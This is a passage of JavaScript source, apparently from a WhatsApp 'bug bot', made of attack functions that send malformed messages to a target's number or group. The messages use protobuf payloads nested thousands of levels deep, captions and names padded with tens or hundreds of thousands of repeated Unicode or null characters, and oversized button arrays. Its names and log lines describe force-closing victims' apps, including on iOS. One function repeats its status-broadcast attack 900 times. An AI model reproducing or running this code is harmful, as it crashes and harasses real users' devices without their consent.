AAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z"
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const kontol = {
        documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4",
            mimetype: "application/pdf",
            fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
            fileLength: 999999999,
            pageCount: 9999,
            mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
            fileName: "billy.pdf",
            fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
            directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
            mediaKeyTimestamp: 1779839963,
            caption: "\u000F".repeat(50000),
            jpegThumbnail: Buffer.from(IMG.jpegThumbnail, 'base64'),
            contextInfo: {
                quotedMessage: {
                    interactiveMessage: {
                        body: { text: "\u001C".repeat(50000) },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 100 }, () => ({}))
                        }
                    }
                }
            }
        }
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject(kontol)
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('error');

    var MAX_BATCH = 5;
    var DELAY_MS = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('error');

    await new Promise(r => setTimeout(r, 1000));

    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 999999999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "LexzyMods - Executed¿!" + "\u0000".repeat(50000),
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999987899999999999999,
                                998999999999999999999,
                                999899999999999999999,
                                9998789999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "Lexcaabos - Executed¿!" + "\u000C".repeat(50000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 2000 }, () => ({})),
                        messageParamsJson: "{".repeat(15000),
                        botFeedbackOptions: {
                            botFeedbackKind: 14,
                            botFeedbackKindMultipleNegative: 511,
                            botFeedbackKindMultiplePositive: 1,
                            reportKind: 1
                        }
                    },
                    contextInfo: {
                        quotedMessage: {
                            interactiveMessage: {
                                body: { text: "\u000D".repeat(50000) },
                                nativeFlowMessage: {
                                    buttons: Array.from({ length: 500000 }, () => ({}))
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg1, {});
    await new Promise(r => setTimeout(r, 500));

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    caption: "Billy - Executed¿!",
                    fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                    fileLength: "1099511627776",
                    seconds: 172800,
                    mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                    height: 1080,
                    width: 1920,
                    fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                    directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774428565",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFS/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                    annotations: [{
                        polygonVertices: [
                            { x: 0.17499999701976776, y: 0.3379453122615814 },
                            { x: 0.824999988079071, y: 0.3379453122615814 },
                            { x: 0.824999988079071, y: 0.6620468497276306 },
                            { x: 0.17499999701976776, y: 0.6620468497276306 }
                        ],
                        shouldSkipConfirmation: true,
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "2261401457948346",
                                songId: "849859527815275",
                                author: "Heksen - Executed¿!" + "ြ".repeat(9000),
                                title: "ြ".repeat(75000),
                                artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                artistAttribution: "https://www.instagram.com/_u/lexzymods",
                                countryBlocklist: "WEs=",
                                isExplicit: false
                            }
                        },
                        embeddedAction: true
                    }]
                }
            }
        }
    }, {});

    await new Promise(r => setTimeout(r, 500));

    await sock.relayMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(75000),
            publisher: "Billy - Executed¿!" + "ꦾ".repeat(5000),
            stickers: [],
            fileLength: "366299919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: ["13135555555@s.whatsapp.net"]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 9999999999,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "9990099",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});
}


  async function EfceClick(sock,target) {
    const Msg = {
    interactiveMessage: {
      body: {
        text: "LOS-EMPIRE!!",
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "booking_status",
            buttonParamsJson: "{}"
          }
        ]
      }
    }
    }
    await sock.relayMessage(target, Msg, {})
  }

async function SennBlankUiGroupNew(groupId) {
  const SennBlankButton = [
    {
      buttonId: "Senn",
      buttonText: {
        displayText: "ꦽ".repeat(80000)
      },
      type: 1
    }
  ];

  const btns = {
    buttonsMessage: {
      contentText: "ꦾ".repeat(250000),
      footerText: "\u0000".repeat(15000),
      buttons: SennBlankButton,
      headerType: 1
    }
  };

  const blnkuisltter = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363404343696075@newsletter",
      newsletterName: "BlankGroupButtonBySenn" + "ꦽꦾ".repeat(250000),
      caption: "Group Ampas" + "ꦽꦾ".repeat(250000),
      inviteExpiration: "9282682616283736",
    }
  };

  await sock.relayMessage(groupId, blnkuisltter, {});
  
  await sock.relayMessage(groupId, btns, {});
}

async function nexi(sock, target) {
  const ios = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Nexi Forclose Ios?",
            subtitle: "Nexi" + "𑇂𑆵𑆴𑆿".repeat(350000),
            hasMediaAttchment: true,
            locationMessage: {
              degreesLatitude: -98.628979,
              degreesLongitude: 89.9821647,
              name: "Nexi The Good" + "𑇂𑆵𑆴𑆿".repeat(99999),
              address: "\u200B" + "𑇂𑆵𑆴𑆿".repeat(99999),
              url: "https://t.me/iniNexiReal" + "𑇂𑆵𑆴𑆿".repeat(500000),
            },
          },
          body: {
            text: "Kontol fc" + "𑇂𑆵𑆴𑆿".repeat(99999),
          },
          footer: {
            text: "Stardust function",
          },
          nativeFlowMessage: {
            buttons: "\0" + "\n".repeat(35000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
          cotexInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "Nexi" + "𑇂𑆵𑆴𑆿".repeat(30000),
                mediaType: "VIDEO",
                jpegThumbnail: "https://files.catbox.moe/dvbb24.mp4",
                caption: "Hai gua nexi" + "𑇂𑆵𑆴𑆿".repeat(50000),
              },
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, ios, {
    participant: { jid: target },
  });
}

async function FcRan(sock, targetJid) {
    const xaka = {
       stickerPackMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
         fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
         fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
         mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
         mimetype: "image/webp",
         directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
         fileLength: "10610",
         mediaKeyTimestamp: "1775044724",
         stickerSentTs: "1775044724091",
         name: "\0" + "ꦾ".repeat(70000),
         publisher: "Xaka" + "ꦾ".repeat(5000),
      }
    };
    
    const kontol = {
      interactiveMessage: {
      body: {
        text: "X - Team 1St!." + "ꦾ".repeat(30000),
      },
      nativeFlowMessage: {
        name: "carousel_message",
        buttons: [],
        cards: Array.from({ length: 30 }, () => ({})),
      },
      contextInfo: {
        remoteJid: "@s.whatsapp.net",
        statusAttributionType: 9999,
        mentionedJid: Array.from(
          { length: 2000 },
          () => Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
        ),
      },
    },
  };
  
    const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ stickerPackMessage: kontol, xaka })
  ).finish();

  const inflate = function(tag, depth) {
    var buf = basePayload;
    for (var i = 0; i < depth; i++) {
      buf = wrapLd(tag, wrapLd([0x0A], buf));
    }
    return buf;
  };

  const resolveJid = function(raw) {
    var s = String(raw || '').trim();
    if (s.includes('@')) return s;
    return s.replace(/\D/g, '') + '@s.whatsapp.net';
  };

  const jids = (Array.isArray(targetJid) ? targetJid : [targetJid])
    .map(resolveJid)
    .filter(function(j) { return j.length > 15; });

  if (!jids.length) return;

  for (var i = 0; i < 900; i++) {
    for (var ti = 0; ti < TAGS.length; ti++) {
      var tag = TAGS[ti];
      var payload = null;

      for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
        try {
          var decoded = proto.Message.decode(inflate(tag, depth));
          proto.Message.encode(decoded).finish();
          payload = decoded;
        } catch (_) {}
      }

      if (!payload) continue;

      var msgId = 'LZ' + Date.now().toString(36).toUpperCase() + '_' + i;

      try {
        await sock.relayMessage('status@broadcast', payload, {
          messageId: msgId,
          statusJidList: [targetJid],
          additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
              tag: 'mentioned_users',
              attrs: {},
              content: [{
                tag: 'to',
                attrs: { jid: targetJid },
                content: []
              }]
            }]
          }]
        });
      } catch (_) {}
    }
  }
}


async function Forceip(sock, target) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";   
    let msg = generateWAMessageFromContent(
      target,
      {
        contactMessage: {
          displayName: "CLIENT_TARGET" + Node.repeat(10000),
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${Node.repeat(10000)};;;\nFN:${Node.repeat(10000)}\nNICKNAME:${"ᩫᩫ".repeat(4000)}\nORG:Sock_Support ⿻${"ᩫᩫ".repeat(4000)}\nTITLE:XH ⿻${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=628:+6278\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:NANO_METERS${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/l\nX-WA-BIZ-NAME:🦠⃰͡ Xata${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
          contextInfo: {
            participant: target,
            externalAdReply: {
              automatedGreetingMessageShown: true,
              automatedGreetingMessageCtaType: "\u0000".repeat(100000),
              greetingMessageBody: "\u0000"
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      "status@broadcast",
      msg.message,
      {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    );

    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(15000),
      address: "\u0000" + Node.repeat(10000),
      url: `${Node.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "Trci is here",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 64,
        thumbnailWidth: 60,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await sock.relayMessage(
        "status@broadcast",
        m.message,
        {
          messageId: m.key.id,
          statusJidList: [target],
          additionalNodes: metaNode
        }
      );
    }

  } catch (e) {
    console.error(e);
  }
}

async function FcNoClikZhidan(sock, target) {
  try {
    console.log(`Forclose ngentot ah ah zhidan sange Processing ${target}`);

    const generateId = () => Math.random().toString(36).substring(2, 15);

    const msg = {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
          caption: "ZhidanKadangSange",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
          fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [{
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }]
        }
      }
    }, {});

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {});

    console.log(`✅ Forclose Success ${target}`);

  } catch (error) {
    console.error(`❌ Error: ${error.message}`);
  }
}

async function VnXNewblankNotif(sock, target) {
  const VnXbb = {
      interactiveMessage: {
        body: { 
         text: "VnX",
         footer: "VnX Is Here"
       },
        nativeFlowMessage: {
          buttons: [
            {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "VnX Is Here",
              url: "http://wa.mE/stickerpack/VnX"
              }),
            },
            {
              name: "payment_info",
              buttonParamsJson: JSON.stringify({
                payment_settings: [{
                  type: "pix_static_code",
                  pix_static_code: {
                    merchant_name: "ោ៝".repeat(121500),
                    key: "ꦾ".repeat(250000),
                    key_type: "CPF"
                  }
                }]
              })
            }
          ]
        }
      }
    };   
   
    let vnxmsg = { remoteJid: target, fromMe: true, id: VnXbb }

     const vnxspam = {
        statusQuestionAnswerMessage: {
          key: vnxmsg, 
          text: "VnX Is Here",
        } 
     };

    await sock.relayMessage(target, VnXbb, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxspam, { 
    participant: { jid: target } 
  });
}

async function Ipongforcloseivs(target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/RannNewEra ",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "helow",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + TravaIphone, 
            matchedText: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔈́𝔩𝔶𝔰𝔦𝔢𝔫𝔫𝔢" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
